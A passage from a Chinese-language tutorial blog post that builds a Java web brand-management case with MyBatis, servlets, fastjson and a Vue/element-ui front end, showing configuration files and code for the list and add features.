       (<span class="hljs-string">&#x27;华为&#x27;</span>, <span class="hljs-string">&#x27;华为技术有限公司&#x27;</span>, <span class="hljs-number">100</span>, <span class="hljs-string">&#x27;万物互联&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;小米&#x27;</span>, <span class="hljs-string">&#x27;小米科技有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;are you ok&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;格力&#x27;</span>, <span class="hljs-string">&#x27;格力电器股份有限公司&#x27;</span>, <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;让世界爱上中国造&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;阿里巴巴&#x27;</span>, <span class="hljs-string">&#x27;阿里巴巴集团控股有限公司&#x27;</span>, <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;买买买&#x27;</span>, <span class="hljs-number">1</span>),
       (<span class="hljs-string">&#x27;腾讯&#x27;</span>, <span class="hljs-string">&#x27;腾讯计算机系统有限公司&#x27;</span>, <span class="hljs-number">50</span>, <span class="hljs-string">&#x27;玩玩玩&#x27;</span>, <span class="hljs-number">0</span>),
       (<span class="hljs-string">&#x27;百度&#x27;</span>, <span class="hljs-string">&#x27;百度在线网络技术公司&#x27;</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;搜搜搜&#x27;</span>, <span class="hljs-number">0</span>),
       (<span class="hljs-string">&#x27;京东&#x27;</span>, <span class="hljs-string">&#x27;北京京东世纪贸易有限公司&#x27;</span>, <span class="hljs-number">40</span>, <span class="hljs-string">&#x27;就是快&#x27;</span>, <span class="hljs-number">1</span>);</code></pre>

<h4 id="2-3-配置信息"><a href="#2-3-配置信息" class="headerlink" title="2.3 配置信息"></a>2.3 配置信息</h4><h5 id="mybatis"><a href="#mybatis" class="headerlink" title="mybatis"></a>mybatis</h5><p>将mybatis的配置文件<code>mybatis-config.xml</code>copy到<code>src/main/resource</code>目录下</p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">configuration</span></span>
<span class="hljs-meta">        <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Config 3.0//EN&quot;</span></span>
<span class="hljs-meta">        <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-config.dtd&quot;</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">typeAliases</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;com.itheima.pojo&quot;</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">typeAliases</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">environments</span> <span class="hljs-attr">default</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">environment</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;development&quot;</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">transactionManager</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;JDBC&quot;</span>/&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">dataSource</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;POOLED&quot;</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;driver&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>/&gt;</span>
                
               <span class="hljs-comment">&lt;!-- 配置数据名 javastudy 用户名和密码--&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;jdbc:mysql:///javastudy?useSSL=false&quot;</span>/&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;username&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;root&quot;</span>/&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">property</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;password&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;root&quot;</span>/&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">dataSource</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">environment</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">environments</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">mappers</span>&gt;</span>
       <span class="hljs-comment">&lt;!--扫描mapper 这里根据项目的mapper目录配置--&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">package</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;com.itheima.mapper&quot;</span>/&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">mappers</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span></code></pre>

<h5 id="maven"><a href="#maven" class="headerlink" title="maven"></a>maven</h5><p><code>pom.xml</code></p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span>
<span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span>
<span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.example<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>brand-case<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.0-SNAPSHOT<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!--web项目将打包成war格式 </span>
<span class="hljs-comment">		普通项目则为jar </span>
<span class="hljs-comment">	--&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">packaging</span>&gt;</span>war<span class="hljs-tag">&lt;/<span class="hljs-name">packaging</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">properties</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.source</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.source</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">maven.compiler.target</span>&gt;</span>8<span class="hljs-tag">&lt;/<span class="hljs-name">maven.compiler.target</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">properties</span>&gt;</span>


    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span>
        <span class="hljs-comment">&lt;!--Servlet--&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.servlet<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javax.servlet-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>provided<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>

		
        <span class="hljs-comment">&lt;!--MyBatis依赖--&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.5.5<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
        <span class="hljs-comment">&lt;!--MySQL--&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>5.1.34<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>


        <span class="hljs-comment">&lt;!--fastjson json转object时用到--&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.62<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>


    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span>

    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat.maven<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat7-maven-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
                <span class="hljs-comment">&lt;!-- 这里可以配置tomcat的port和根路径 --&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span></code></pre>

<h5 id="包"><a href="#包" class="headerlink" title="包"></a>包</h5><p>在<code>/scr/main/java</code>中新建<code>pojo</code>、<code>mapper</code>、<code>service</code>、<code>web</code>、<code>util</code>等包</p>
<table>
<thead>
<tr>
<th>包名</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td>pojo</td>
<td>存放实体类，比如Brand、User等</td>
</tr>
<tr>
<td>mapper</td>
<td>存放对应的Mapper接口 比如BrandMapper</td>
</tr>
<tr>
<td>service</td>
<td>存放提供服务的类BrandService</td>
</tr>
<tr>
<td>web</td>
<td>存放web层使用到的Servlet</td>
</tr>
<tr>
<td>util</td>
<td>存放工具包</td>
</tr>
</tbody></table>
<p>创建<code>src/main/resources/com/itheima/mapper/</code>目录，该目录存放<code>BrandMapper.xml</code></p>
<p>该文件在tomcat启动后自动保存到<code>src/main/java/com/itheima/mapper/BrandMapper.xml</code></p>
<h2 id="前端页面"><a href="#前端页面" class="headerlink" title="前端页面"></a>前端页面</h2><p>登录和注册页面使用html和javascript设计</p>
<p>展示页面使用Vue和element-ui设计出一个简单的展示页面</p>
<h2 id="功能实现"><a href="#功能实现" class="headerlink" title="功能实现"></a>功能实现</h2><h3 id="1-查询所有"><a href="#1-查询所有" class="headerlink" title="1.查询所有"></a>1.查询所有</h3><h4 id="需求分析"><a href="#需求分析" class="headerlink" title="需求分析"></a>需求分析</h4><ul>
<li>当页面加载完成后，数据需要展示到出来，所以需要在Vue中<code>mounted</code>构造函数中写发送异步请求的代码</li>
<li>并且发送请求时无需携带参数</li>
<li>服务器返回所有数据，其格式为json格式，返回的参数绑定到vue的模型中，显示到页面中</li>
</ul>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220330140534899.png" alt="image-20220330140534899"></p>
<h4 id="后端实现"><a href="#后端实现" class="headerlink" title="后端实现"></a>后端实现</h4><h5 id="dao"><a href="#dao" class="headerlink" title="dao"></a>dao</h5><p>在<code>com.itheima.mapper.BrandMapper</code>接口中添加<code>selectAll()</code>方法</p>
<pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 查询所有</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment"> */</span>
<span class="hljs-meta">@Select(&quot;select * from tb_brand&quot;)</span>
<span class="hljs-meta">@ResultMap(&quot;brandResultMap&quot;)</span>
List&lt;Brand&gt; <span class="hljs-title function_">selectAll</span><span class="hljs-params">()</span>;</code></pre>

<p>由于表中有些字段名和实体类中的属性名没有对应，所以需要在 <code>com/itheima/mapper/BrandMapper.xml</code> 映射配置文件中定义结果映射 ，使用<code>resultMap</code> 标签。映射配置文件内容如下：</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;brandResultMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;brand&quot;</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;brandName&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;brand_name&quot;</span>/&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;companyName&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;company_name&quot;</span>/&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span></code></pre>

<h5 id="service"><a href="#service" class="headerlink" title="service"></a>service</h5><p>在<code>com.itheima.mapper</code>中创建<code>BrandService</code>类</p>
<pre><code class="hljs java">   <span class="hljs-comment">// 获取sqlSessionFactory</span>
<span class="hljs-comment">// 该类 存放在util包中，封装后方便使用</span>
   <span class="hljs-type">SqlSessionFactory</span> <span class="hljs-variable">sqlSessionFactory</span> <span class="hljs-operator">=</span> SqlSessionFactoryUtils.getSqlSessionFactory();

   <span class="hljs-comment">/**</span>
<span class="hljs-comment">    * 查询所有</span>
<span class="hljs-comment">    * <span class="hljs-doctag">@return</span></span>
<span class="hljs-comment">    */</span>
   <span class="hljs-keyword">public</span> List&lt;Brand&gt; <span class="hljs-title function_">selectAll</span><span class="hljs-params">()</span>&#123;
       <span class="hljs-type">SqlSession</span> <span class="hljs-variable">sqlSession</span> <span class="hljs-operator">=</span> sqlSessionFactory.openSession();
       <span class="hljs-comment">// 获取 BrandMapper</span>
       <span class="hljs-type">BrandMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> sqlSession.getMapper(BrandMapper.class);
	<span class="hljs-comment">// 调用方法</span>
       List&lt;Brand&gt; brands = mapper.selectAll();
       sqlSession.close();
       <span class="hljs-comment">// 返回查询到的数据</span>
       <span class="hljs-keyword">return</span> brands;
   &#125;</code></pre>

<h5 id="servlet"><a href="#servlet" class="headerlink" title="servlet"></a>servlet</h5><p>在<code>com.itheima.web</code>中创建<code>SelectAllServlet</code>可以使用Idea提供的模板创建自动继承<code>HttpServlet</code></p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.itheima.web.servlet;

<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;
<span class="hljs-keyword">import</span> com.itheima.pojo.Brand;
<span class="hljs-keyword">import</span> com.itheima.service.BrandService;
<span class="hljs-keyword">import</span> jdk.nashorn.internal.ir.CallNode;

<span class="hljs-keyword">import</span> javax.servlet.*;
<span class="hljs-keyword">import</span> javax.servlet.http.*;
<span class="hljs-keyword">import</span> javax.servlet.annotation.*;
<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@WebServlet(value = &quot;/selectAllServlet&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SelectAllServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;
    <span class="hljs-comment">// 创建BrandService</span>
    <span class="hljs-keyword">private</span> <span class="hljs-type">BrandService</span> <span class="hljs-variable">service</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BrandService</span>();

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;
		<span class="hljs-comment">// 调用BrandService中的selectAll方法</span>
        List&lt;Brand&gt; brandList = service.selectAll();
        <span class="hljs-comment">// 将brand对象转换为json字符串</span>
        <span class="hljs-type">String</span> <span class="hljs-variable">string</span> <span class="hljs-operator">=</span> JSON.toJSONString(brandList);
		<span class="hljs-comment">// 设置响应数据类型为json</span>
        response.setContentType(<span class="hljs-string">&quot;text/json;charset=utf-8&quot;</span>);
        <span class="hljs-comment">//响应数据</span>
        response.getWriter().write(string);
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;
        doGet(request, response);
    &#125;
&#125;
</code></pre>



<h4 id="前端实现"><a href="#前端实现" class="headerlink" title="前端实现"></a>前端实现</h4><p>前端需要在页面加载完毕后发送 ajax 请求，所以发送请求的逻辑应该放在 <code>mounted()</code> 钩子函数中。而响应回来的数据需要赋值给表格绑定的数据模型，从代码中可以看出表格绑定的数据模型是 <code>brandlist</code></p>
<pre><code class="hljs xml"><span class="hljs-comment">&lt;!--表格--&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">el-table</span></span>
<span class="hljs-tag">            <span class="hljs-attr">:data</span>=<span class="hljs-string">&quot;brandlist&quot;</span></span>
<span class="hljs-tag">            <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;width: 100%&quot;</span></span>
<span class="hljs-tag">            <span class="hljs-attr">:row-class-name</span>=<span class="hljs-string">&quot;tableRowClassName&quot;</span></span>
<span class="hljs-tag">            @<span class="hljs-attr">selection-change</span>=<span class="hljs-string">&quot;handleSelectionChange&quot;</span></span>
<span class="hljs-tag">    &gt;</span></code></pre>

<p>ajax请求为</p>
<pre><code class="hljs javascript"><span class="hljs-attr">methods</span>:&#123;
	<span class="hljs-title function_">selectAll</span>(<span class="hljs-params"></span>)&#123;
            <span class="hljs-keyword">var</span> _this = <span class="hljs-variable language_">this</span>;
                <span class="hljs-title function_">axios</span>(&#123;
                    <span class="hljs-attr">method</span>: <span class="hljs-string">&#x27;GET&#x27;</span>,
                    <span class="hljs-attr">url</span>: <span class="hljs-string">&#x27;http://localhost:8080/brand-case/brand/selectAll&#x27;</span>
                &#125;).<span class="hljs-title function_">then</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params">response</span>)&#123;
                    <span class="hljs-keyword">var</span> brandlist = response.<span class="hljs-property">data</span>;
                    _this.<span class="hljs-property">brandlist</span> = brandlist;
                &#125;)
        &#125;
    &#125;
<span class="hljs-title function_">mounted</span>(<span class="hljs-params"></span>)&#123;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">selectAll</span>;
&#125;
</code></pre>

<h3 id="2-添加功能"><a href="#2-添加功能" class="headerlink" title="2.添加功能"></a>2.添加功能</h3><h4 id="需求分析-1"><a href="#需求分析-1" class="headerlink" title="需求分析"></a>需求分析</h4><ul>
<li>用户请求后台时需要携带数据，且为post请求，携带的数据类型为json类型</li>
<li>后端服务器获取json数据后将其转换为Brand类型</li>
<li>添加成功后响应前端</li>
</ul>
<h4 id="后端实现-1"><a href="#后端实现-1" class="headerlink" title="后端实现"></a>后端实现</h4><h5 id="dao-1"><a href="#dao-1" class="headerlink" title="dao"></a>dao</h5><p>在<code>BrandMapper</code>中添加addBrand()方法</p>
<pre><code class="hljs java"><span class="hljs-comment">/**</span>
<span class="hljs-comment"> * 添加</span>
<span class="hljs-comment"> * <span class="hljs-doctag">@param</span> brand</span>
<span class="hljs-comment"> */</span>
<span class="hljs-meta">@Insert(&quot;insert into tb_brand values (null, #&#123;brandName&#125;, #&#123;companyName&#125;, #&#123;ordered&#125;,#&#123;description&#125;, #&#123;status&#125;)&quot;)</span>
<span class="hljs-keyword">void</span> <span class="hljs-title function_">addBrand</span><span class="hljs-params">(Brand brand)</span>;</code></pre>

<h5 id="service-1"><a href="#service-1" class="headerlink" title="service"></a>service</h5><p>在BrandService中实现addBrand()业务逻辑方法</p>
<pre><code class="hljs java">  <span class="hljs-comment">/**</span>
<span class="hljs-comment">   * 添加</span>
<span class="hljs-comment">   * <span class="hljs-doctag">@param</span> brand</span>
<span class="hljs-comment">   */</span>
  <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addBrand</span><span class="hljs-params">(Brand brand)</span>&#123;
      <span class="hljs-type">SqlSession</span> <span class="hljs-variable">sqlSession</span> <span class="hljs-operator">=</span> sqlSessionFactory.openSession();
      <span class="hljs-type">BrandMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> sqlSession.getMapper(BrandMapper.class);

      mapper.addBrand(brand);
<span class="hljs-comment">// 对数据库的增删改 记得提交事务</span>
      sqlSession.commit();
      sqlSession.close();
  &#125;</code></pre>

<h5 id="servlet-1"><a href="#servlet-1" class="headerlink" title="servlet"></a>servlet</h5><p>前端请求时携带json数据，<code>request.getParamter()</code>无法获取，需要使用获取请求体的方法<code>request.getReader()</code></p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.itheima.web.servlet;

<span class="hljs-keyword">import</span> com.alibaba.fastjson.JSON;
<span class="hljs-keyword">import</span> com.itheima.pojo.Brand;
<span class="hljs-keyword">import</span> com.itheima.service.BrandService;

<span class="hljs-keyword">import</span> javax.servlet.ServletException;
<span class="hljs-keyword">import</span> javax.servlet.annotation.WebServlet;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServlet;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;
<span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;
<span class="hljs-keyword">import</span> java.io.BufferedReader;
<span class="hljs-keyword">import</span> java.io.IOException;
<span class="hljs-keyword">import</span> java.util.List;

<span class="hljs-meta">@WebServlet(value = &quot;/addServlet&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">AddServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;
    <span class="hljs-keyword">private</span> <span class="hljs-type">BrandService</span> <span class="hljs-variable">service</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BrandService</span>();

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;
        <span class="hljs-comment">// getParamter无法获取json数据</span>
        <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">reader</span> <span class="hljs-operator">=</span> request.getReader();
        <span class="hljs-type">String</span> <span class="hljs-variable">line</span> <span class="hljs-operator">=</span> reader.readLine();
        System.out.println(line);
        <span class="hljs-comment">// 将json数据转换为Brand对象</span>
        <span class="hljs-type">Brand</span> <span class="hljs-variable">brand</span> <span class="hljs-operator">=</span> JSON.parseObject(line, Brand.class);
        System.out.println(brand);
        service.addBrand(brand);

		<span class="hljs-comment">// 返回的响应数据      </span>
        response.getWriter().write(<span class="hljs-string">&quot;success&quot;</span>);
    &#125;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doPost</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;
        doGet(request, response);
    &#125;
&#125;</code></pre>

<h4 id="前端实现-1"><a href="#前端实现-1" class="headerlink" title="前端实现"></a>前端实现</h4><h5 id="添加的对话框"><a href="#添加的对话框" class="headerlink" title="添加的对话框"></a>添加的对话框</h5><p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220330144307668.png" alt="image-20220330144307668"></p>
<p>初始时该对话框为隐藏状态，其状态有<code>dialogVisible</code>控制，默认情况下为false</p>
<pre><code class="hljs js">&lt;el-dialog
        title=<span class="hljs-string">&quot;添加品牌&quot;</span>
        :visible.<span class="hljs-property">sync</span>=<span class="hljs-string">&quot;dialogVisible&quot;</span>
        width=<span class="hljs-string">&quot;30%&quot;</span>
        &gt;</code></pre>

<p>当点击添加按钮时，将<code>dialogVisible</code>设置为<code>true</code>，对话框弹出，便可以编辑数据</p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;primary&quot;</span> <span class="hljs-attr">plain</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;dialogVisible = true&quot;</span>&gt;</span>新增<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span></code></pre>

<h5 id="提交数据"><a href="#提交数据" class="headerlink" title="提交数据"></a>提交数据</h5><p>对话框实际上是一个form表单，该表单数据与<code>brand</code>模型绑定，所以请求后端时提交brand即可</p>
<pre><code class="hljs js"><span class="hljs-keyword">new</span> <span class="hljs-title class_">Vue</span>(&#123;
	<span class="hljs-title function_">data</span>(<span class="hljs-params"></span>)&#123;
	<span class="hljs-keyword">return</span> &#123;
		<span class="hljs-comment">// 品牌模型数据</span>
         <span class="hljs-attr">brand</span>: &#123;
                    <span class="hljs-attr">status</span>: <span class="hljs-string">&#x27;&#x27;</span>,
                    <span class="hljs-attr">brandName</span>: <span class="hljs-string">&#x27;&#x27;</span>,
                    <span class="hljs-attr">companyName</span>: <span class="hljs-string">&#x27;&#x27;</span>,
                    <span class="hljs-attr">id</span>:<span class="hljs-string">&quot;&quot;</span>,
                    <span class="hljs-attr">ordered</span>:<span class="hljs-string">&quot;&quot;</span>,
                    <span class="hljs-attr">description</span>:<span class="hljs-string">&quot;&quot;</span>
                &#125;,
	&#125;
	&#125;
&#125;)</code></pre>

<p>提交和取消按钮</p>
<pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;primary&quot;</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;addBrand&quot;</span>&gt;</span>提交<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span>
<span class="hljs-comment">&lt;!--取消 只需要将dialogVisble设置为false即可隐藏对话框--&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">el-button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;dialogVisible = false&quot;</span>&gt;</span>取消<span class="hljs-tag">&lt;/<span class="hljs-name">el-button</span>&gt;</span></code></pre>

<p><code>addBrand</code></p>
<pre><code class="hljs js"><span class="hljs-comment">// 添加数据</span>
            <span class="hljs-title function_">addBrand</span>(<span class="hljs-params"></span>)&#123;
                <span class="hljs-keyword">var</span> _this = <span class="hljs-variable language_">this</span>;
                <span class="hljs-variable language_">this</span>.<span class="hljs-property">currentPage</span>=<span class="hljs-number">1</span>
